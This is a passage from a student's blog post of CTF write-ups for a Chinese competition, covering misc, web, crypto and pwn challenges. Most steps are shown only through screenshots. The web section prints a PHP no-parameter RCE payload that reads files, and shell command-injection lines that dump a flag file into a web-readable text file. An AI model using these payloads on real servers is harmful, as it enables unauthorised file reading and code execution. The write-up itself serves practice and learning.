<li><p>将宽度像素转成十六进制，在winhex里找到，然后改成和长度一样像素的十六进制数<br><img src="https://note.youdao.com/yws/api/personal/file/WEB7c091ea9ff969f4223e754625974f4bc?method=download&shareKey=7a83e41741130e5ec813ff11815541a5"><br><img src="https://note.youdao.com/yws/api/personal/file/WEB44ea8c397ec9eae46b91090301d9792e?method=download&shareKey=20866f5d346bbca0c1d8a75a7dd58051"></p>
</li>
<li><p>重新生成图片就看到flag<br><img src="https://note.youdao.com/yws/api/personal/file/WEB9d3efe8dc0b6a2a306f9147df46b4e65?method=download&shareKey=cf739286553055a2035326fdff5c0a76"></p>
</li>
</ul>
<h2 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h2><ul>
<li><p>由于是lsb，直接如图试一下<br><img src="https://note.youdao.com/yws/api/personal/file/WEBa250a0f99f04e39a587e03c1697afa02?method=download&shareKey=13a51d901d090ff817984b92546d43e0"></p>
</li>
<li><p>得到一张二维码，扫描得到flag<br><img src="https://note.youdao.com/yws/api/personal/file/WEBa6f798045af81d590e39690fc88e559b?method=download&shareKey=98d8d7a35a1783e7ee14fccc5d62759e"></p>
</li>
</ul>
<h2 id="你能破解吗？"><a href="#你能破解吗？" class="headerlink" title="你能破解吗？"></a>你能破解吗？</h2><ul>
<li><p>最开始想会不会是伪加密，试了一下不是<br><img src="https://note.youdao.com/yws/api/personal/file/WEBa9a845cfe8ba19bcae5d4c117abe789d?method=download&shareKey=787ff01c72b348e38d03b87d51a53501"></p>
</li>
<li><p>既然不是伪加密，那就爆破,得到密码，拿到flag<br><img src="https://note.youdao.com/yws/api/personal/file/WEBf889789cf2fba18bd8391826da6ee3eb?method=download&shareKey=74c89976ae03670c6b17effd28111df2"></p>
</li>
</ul>
<h2 id="老烟枪"><a href="#老烟枪" class="headerlink" title="老烟枪"></a>老烟枪</h2><ul>
<li><p>做的时候知道用binwalk，但虚拟机没弄好，所以用了同学的另一个方法，下面是后来重新做的<br><img src="https://note.youdao.com/yws/api/personal/file/WEB62fe40bc3ad49dcc11ae3964e20c94e6?method=download&shareKey=220d75e207fca8989c1544a881bea0b4"></p>
</li>
<li><p>接着用winhex分离，得到一张图片，翻转后就是flag<br><img src="https://note.youdao.com/yws/api/personal/file/WEBfb0abdc5b235bc4f44bb9eace3618f2d?method=download&shareKey=6a16b06f2dd67838fb7565408af40404"><br><img src="https://note.youdao.com/yws/api/personal/file/WEB2018495297d9ebc2909d08c8f1e63692?method=download&shareKey=1b5ce61703793d3388b872fc08c13af8"></p>
</li>
</ul>
<h2 id="disk"><a href="#disk" class="headerlink" title="disk"></a>disk</h2><ul>
<li>extundelete一直没弄好，等弄好后补充。<br><img src="https://note.youdao.com/yws/api/personal/file/WEBece05c5ae0fab98ce73019c9e1819eca?method=download&shareKey=e242463e7f13597ab3fb0379ed10a5ed"></li>
</ul>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="G2mtu学生？"><a href="#G2mtu学生？" class="headerlink" title="G2mtu学生？"></a>G2mtu学生？</h2><ul>
<li>刚开始没有思路，后面想到会不会是ip限制，试一下得到flag<br><img src="https://note.youdao.com/yws/api/personal/file/WEB033293b8ba5731becebcf09a7265ba93?method=download&shareKey=8001660c045b8bb9c51c2982d970308a"></li>
</ul>
<h2 id="Who-are-you"><a href="#Who-are-you" class="headerlink" title="Who are you?"></a>Who are you?</h2><ul>
<li><p>刚开始完全没思路，没做过这类题，后来同学说这是xxe漏洞的题，用伪协议读flag<br><img src="https://note.youdao.com/yws/api/personal/file/WEB9147f26b8a330af61796a2964c373554?method=download&shareKey=7a8a4b8b8489be4e18e6e9f8ca4fa6db"></p>
</li>
<li><p>结果这个flag是错的，读index.php试一下得到flag<br><img src="https://note.youdao.com/yws/api/personal/file/WEB8f1d1aeea5f934b481fc33f595eaf863?method=download&shareKey=a7be3e4ff8f77083b7971d7ce05448f0"><br><img src="https://note.youdao.com/yws/api/personal/file/WEBcb6ee07e871304a4ffe1eb199895507a?method=download&shareKey=54340c1ef88a458af03fbe460a8d1d50"></p>
</li>
</ul>
<h2 id="无参数rce"><a href="#无参数rce" class="headerlink" title="无参数rce"></a>无参数rce</h2><ul>
<li><p>很多函数都被ban了，有想到用array_rand这个函数，但构造不出payload，看了师兄的writeup后知道payload如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bin2hex(file_get_contents(array_rand(array_flip(scandir(current(localeconv()))))));</span><br><span class="line">Var_dump(Readfile(array_rand(array_flip(scandir(Pos(localeconv()))))));</span><br></pre></td></tr></table></figure>
</li>
<li><p>当时一直执着于构造函数，忘了还有另一种方式用SESSIONID来传参<br><img src="https://note.youdao.com/yws/api/personal/file/WEBc60b40dfa2971da05b17b4d8d0cd5e8f?method=download&shareKey=91eb7b12400424193a47bf4794da2548"></p>
</li>
</ul>
<h2 id="神奇的登录框"><a href="#神奇的登录框" class="headerlink" title="神奇的登录框"></a>神奇的登录框</h2><ul>
<li><p>太菜做不出来，看writeup才知道怎么做</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls &gt; 1.txt</span><br><span class="line">cat flagggg.php&gt; 1.txt</span><br><span class="line">&#96;cat flagggg.php&gt; 1.txt&#96;</span><br></pre></td></tr></table></figure>
</li>
<li><p>访问1.txt就得到flag<br><img src="https://note.youdao.com/yws/api/personal/file/WEB33c6e06a310930f565ca9b6806881b7b?method=download&shareKey=2e97c1a7c6ac0d78bb566b5490c948db"></p>
</li>
</ul>
<h2 id="cms"><a href="#cms" class="headerlink" title="cms"></a>cms</h2><ul>
<li>当时做的时候以为可以通过文件上传来做，看writeup才知道是文件包含类型，但复现时不知道为什么老是提示验证码错误，等解决再补充。</li>
</ul>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="恺撒将军"><a href="#恺撒将军" class="headerlink" title="恺撒将军"></a>恺撒将军</h2><ul>
<li><p>刚开始用转换工具弄，但&lt;,[这些都被略过了，脚本又不会写只能这样了，一定要好好学写脚本<br><img src="https://note.youdao.com/yws/api/personal/file/WEB5bc6b7fcc1744e54b13106afb2ce5acc?method=download&shareKey=42891c5083f1642d5cc59267f421d5ad"></p>
</li>
<li><p>最后转下码就得到flag了<br><img src="https://note.youdao.com/yws/api/personal/file/WEBf02687c35d63b9745d0461940d619330?method=download&shareKey=ab4a47a9267e0d9f32c196ac8fe53393"></p>
</li>
</ul>
<h2 id="小明家的小菜园"><a href="#小明家的小菜园" class="headerlink" title="小明家的小菜园"></a>小明家的小菜园</h2><ul>
<li>菜园就有栅栏，考虑栅栏密码，拿到flag<br><img src="https://note.youdao.com/yws/api/personal/file/WEB586b56b1381dc38f925b7969ff9aa45a?method=download&shareKey=047d7e1e8e9dfde6603cca09e895e332"></li>
</ul>
<h2 id="战报"><a href="#战报" class="headerlink" title="战报"></a>战报</h2><ul>
<li><p>把明文和密文分别进行字频分析，将明文密文一一对应<br><img src="https://note.youdao.com/yws/api/personal/file/WEBc73a1450e89f88fb69047a5b2dfd15f9?method=download&shareKey=d4432b52a76563d0f982596bbd60a1d1"><br><img src="https://note.youdao.com/yws/api/personal/file/WEBd3aca44198ebe9cb57640ecd37d5c084?method=download&shareKey=062391dae77ff7b00a2b2deeaac8947d"></p>
</li>
<li><p>然后对照题目给的密文，得到的明文就是flag<br><img src="https://note.youdao.com/yws/api/personal/file/WEBa0221011ec28298bb3e3d93ba7866344?method=download&shareKey=de081135b8b704202613057ea4a2822e"></p>
</li>
</ul>
<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><p><strong>不会</strong></p>
<p><strong>师兄writeup</strong></p>
<blockquote>
<p> <a target="_blank" rel="noopener" href="https://www.getflag.cn/2020/11/19/%E6%B5%B7%E5%95%B8%E6%9D%AF/">第三届海啸杯 | kawhi’s Blog (getflag.cn)</a><br> [第三届海啸杯 write up | (flag2020.top)](<a target="_blank" rel="noopener" href="https://flag2020.top/2020/11/19/%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%B5%B7%E5%95%B8%E6%9D%AF">https://flag2020.top/2020/11/19/第三届海啸杯</a> write up/) </p>
</blockquote>
</div><hr></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://file.51ppt.vip/2020/2-8/192744-1521977264b903.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By YTsang</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.8.2"></script><script src="/js/fancybox.js?version=1.8.2"></script><script src="/js/sidebar.js?version=1.8.2"></script><script src="/js/copy.js?version=1.8.2"></script><script src="/js/fireworks.js?version=1.8.2"></script><script src="/js/transition.js?version=1.8.2"></script><script src="/js/scroll.js?version=1.8.2"></script><script src="/js/head.js?version=1.8.2"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>